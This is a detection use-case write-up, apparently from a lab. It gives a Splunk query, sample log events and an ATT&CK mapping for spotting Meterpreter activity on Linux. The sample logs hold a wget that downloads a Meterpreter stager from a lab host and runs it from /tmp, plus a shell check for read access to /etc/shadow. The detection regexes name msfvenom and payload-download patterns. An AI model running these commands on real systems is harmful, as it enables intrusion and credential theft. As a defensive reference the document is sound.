
# Detection Use Case: Meterpreter Activity Detection in Linux

## Scenario Description

An attacker uses **Meterpreter** on a **Linux system** to establish a reverse shell, execute post-exploitation commands, and possibly maintain persistence. The behavior includes payload creation using `msfvenom`, payload delivery (often via `wget` or `curl`), execution from temporary directories (e.g., `/tmp/`), and interaction through the `meterpreter` shell.

![Screenshot 2025-05-29 184946](https://github.com/user-attachments/assets/63fe67fc-3cb6-4b69-b536-f8add3d92f84)

## Objective

To detect key stages of Meterpreter activity, including stager creation, payload download, payload execution, post-exploitation, and command execution from the Meterpreter session.

## Tools Used

- **SIEM**: Splunk Enterprise
- **Log Source**: Linux Syslog (Command and Network Events)
- **Lab Setup**:
  - Kali Linux VM with Splunk Universal Forwarder
  - Windows host running Splunk Enterprise
  - Logs forwarded from `/var/log/syslog` to Splunk over TCP port 9997

## 🔍 Data Source Mapping

### Syslog (Linux Command Events)

| Field        | Example Value          | Description                           |
|--------------|------------------------|---------------------------------------|
| _time        | 2025-05-23T19:15:00.000| Timestamp of the event                |
| host         | kali                   | Hostname where the command ran       |
| User         | root                   | User that executed the command       |
| CommandLine  | wget -O /tmp/rshell.elf http://... | Full command issued            |
| Image        | /usr/bin/wget          | Binary used to launch the command    |
| ParentImage  | /bin/bash              | Parent process of the current process|

### Network Events

| Field        | Example Value            | Description                     |
|--------------|--------------------------|----------------------------------|
| DestinationIp| 185.91.54.117            | Outbound connection IP           |
| count        | 7                        | Number of hits in 1 minute span  |

---

## 🛡️ Detection Logic: Meterpreter Stage and Command Monitoring

Monitor Linux systems for:

- Use of `msfvenom` to generate payloads.
- Usage of `wget`, `curl` to download files with suspicious extensions.
- Execution of payloads from `/tmp/` or similar directories.
- Use of Meterpreter commands like `shell`, `download`, etc.
- Command execution from processes spawned from recently downloaded payloads.
- Outbound connections to suspicious external IPs.

## 🔎 SPL Query
```spl
index="linux_logs" sourcetype="syslog" host="kali"
| rex field=_raw "<Data Name=\"CommandLine\">(?<CommandLine>[^<]+)</Data>"
| rex field=_raw "<Data Name=\"Image\">(?<Image>[^<]+)</Data>"
| rex field=_raw "<Data Name=\"User\">(?<User>[^<]+)</Data>"
| rex field=_raw "<Data Name=\"ParentImage\">(?<ParentImage>[^<]+)</Data>"
| eval CommandLine=coalesce(CommandLine, "")
| eval ParentImage=coalesce(ParentImage, "-")
| where CommandLine!="" AND NOT match(CommandLine, "(?i)apt-config")
| eval is_payload_download=if(match(CommandLine, "(?i)(wget|curl).*(meterpreter|\.elf|\.raw|\.c|\.py|\.pl|\.sh|\.hex)"), 1, 0)
| eval downloaded_file=if(is_payload_download=1,
    if(match(CommandLine, "-O\s+(\S+)"),
       mvindex(split(replace(CommandLine, ".*-O\s+(\S+).*", "\1"), " "), 0),
       mvindex(split(CommandLine, " "), -1)
    ), null())
| streamstats current=f last(downloaded_file) as last_downloaded_file
| eval is_payload_exec=if(match(CommandLine, "(?i)^/tmp/.*\.(elf|raw|c|py|pl|sh|hex)$"), 1, 0)
| eval is_msfvenom=if(match(CommandLine, "(?i)msfvenom.*meterpreter"), 1, 0)
| eval is_meterpreter_command=if(match(CommandLine, "(?i)(meterpreter\s+>|\bshell\b|\bdownload\b)"), 1, 0)
| eval is_msfconsole=if(match(CommandLine, "(?i)msfconsole"), 1, 0)
| eval parent_base=replace(ParentImage, "^.*/", "")
| eval last_downloaded_base=replace(last_downloaded_file, "^.*/", "")
| eval is_meterpreter_exec_command=if(
    parent_base=last_downloaded_base
    AND (Image="/bin/sh" OR Image="/usr/bin/dash" OR match(Image, "(?i)sh|dash"))
    AND CommandLine!=""
, 1, 0)
| eval attack_phase=case(
        is_msfvenom=1, "Phase_2: Stager Creation",
        is_payload_download=1, "Phase_2: Payload Download",
        is_payload_exec=1, "Phase_3: Payload Execution",
        is_meterpreter_command=1, "Phase_3: Post Exploitation",
        is_msfconsole=1, "Phase_1: Listener Setup",
        is_meterpreter_exec_command=1, "Phase_3: Post Exploitation - Command Execution",
        true(), null())
| where is_msfvenom=1 OR is_payload_download=1 OR is_payload_exec=1 OR is_meterpreter_command=1 OR is_msfconsole=1 OR is_meterpreter_exec_command=1
| eval detection_type="MeterpreterActivity"
| table _time host User Image ParentImage CommandLine attack_phase detection_type
| append [
    search index="linux_logs" sourcetype="syslog" "EventID>3"
    | rex "<Data Name=\"UtcTime\">(?<UtcTime>[^<]+)</Data>"
    | rex "<Data Name=\"DestinationIp\">(?<DestinationIp>[^<]+)</Data>"
    | rex "<Data Name=\"Image\">(?<Image>[^<]+)</Data>"
    | eval _time=strptime(UtcTime, "%Y-%m-%d %H:%M:%S.%3N")
    | where DestinationIp!="0:0:0:0:0:0:0:0" AND DestinationIp!="192.168.1.254"
    | bin _time span=1m
    | stats count by _time DestinationIp
    | where count > 3
    | eval detection_type="HighFrequencyOutbound"
    | table _time DestinationIp count detection_type
]
| sort -_time
```

---

## 🚨 Alerting Criteria

- Detection of **payload download and execution**.
- Use of **meterpreter post-exploitation commands**.
- Outbound traffic burst indicating possible **C2 beaconing**.

![Screenshot 2025-05-29 190421](https://github.com/user-attachments/assets/96b5624e-63ef-4f95-bc8c-78a9ffd55303)

---

## 🧪Log / Sample Detection Events

| Time                         | Host | User | Image                | Parent Image                | Command Line                                                             | Attack Phase                                       | Detection Type       | Destination IP | Count |
|-----------------------------|------|------|----------------------|-----------------------------|---------------------------------------------------------------------------|---------------------------------------------------|----------------------|----------------|-------|
| 2025-05-29T17:40:14.739+0530 | kali | root | /usr/bin/dash        | /tmp/meterpreter_stager.elf | /bin/sh -c uname -n                                                       | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:40:14.228+0530 | kali | root | /usr/bin/dash        | /tmp/meterpreter_stager.elf | /bin/sh -c command -v uname \|\| which uname && echo RNKPGNBB             | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:40:13.413+0530 | kali | root | /usr/bin/dash        | /tmp/meterpreter_stager.elf | /bin/sh -c uname -a                                                       | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:40:12.900+0530 | kali | root | /usr/bin/dash        | /tmp/meterpreter_stager.elf | /bin/sh -c ls /etc                                                        | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:39:56.250+0530 | kali | root | /usr/bin/dash        | /tmp/meterpreter_stager.elf | /bin/sh -c test -r '/etc/shadow' && echo QPshzIlM                         | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:39:12.106+0530 | kali | root | /usr/bin/bash        | /tmp/meterpreter_stager.elf | /bin/bash                                                                 | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:36:22.869+0530 | kali | root | /usr/bin/dash        | /tmp/meterpreter_stager.elf | /bin/sh                                                                   | Phase_3: Post Exploitation - Command Execution     | MeterpreterActivity  |                |       |
| 2025-05-29T17:36:08.733+0530 | kali | root | /tmp/meterpreter_stager.elf | -                     | /tmp/meterpreter_stager.elf                                              | Phase_3: Payload Execution                         | MeterpreterActivity  |                |       |
| 2025-05-29T17:35:31.018+0530 | kali | root | /usr/bin/wget        | -                           | wget http://192.168.1.7:8000/meterpreter_stager.elf -O /tmp/meterpreter_stager.elf | Phase_2: Payload Download               | MeterpreterActivity  |                |       |
| 2025-05-29T17:33:44.172+0530 | kali | root | /usr/bin/wget        | -                           | wget http://192.168.1.7:8000/meterpreter_stager.elf -O /tmp/meterpreter_stager.elf | Phase_2: Payload Download               | MeterpreterActivity  |                |       |
| 2025-05-28T19:22:00.000+0530 |      |      |                      |                             |                                                                           | C2 beaconing                                      |                      | 192.168.1.7     | 4     |
| 2025-05-28T19:20:00.000+0530 |      |      |                      |                             |                                                                           | C2 beaconing                                      |                      | 192.168.1.7     | 4     |
---

![Screenshot 2025-05-29 185016](https://github.com/user-attachments/assets/cc567d15-fb8d-4436-aad0-6d20bb171476)

## ✅ Detection Status

**Working – Tested** on simulated Meterpreter activities from a Kali Linux VM. Successfully captured download, execution, and C2 interaction patterns.

## 🧠 Analyst Notes / Recommendations

- Confirm command context and source IPs.
- Cross-reference with threat intel (e.g., IP reputation, domains).
- Correlate with asset criticality and time of activity.
- Examine reverse shell or post-exploitation traces.

## 🔗 MITRE ATT&CK Mapping

| Technique ID | Technique Name                              | Description                                           |
|--------------|---------------------------------------------|-------------------------------------------------------|
| T1059        | Command and Scripting Interpreter           | Use of bash, sh, or Python to execute payloads        |
| T1027        | Obfuscated Files or Information             | Executable downloaded with uncommon extensions        |
| T1105        | Ingress Tool Transfer                       | Downloading remote tools (e.g., wget, curl)           |
| T1055        | Process Injection                           | Potential injection from downloaded payloads          |
| T1068        | Exploitation for Privilege Escalation       | If payload provides root shell via exploit            |
| T1219        | Remote Access Software                      | Meterpreter usage for persistent access               |
| T1041        | Exfiltration Over C2 Channel                | Using meterpreter shell to download/upload            |
| T1071.001    | Application Layer Protocol: Web Protocols   | C2 communication over HTTP/S                          |
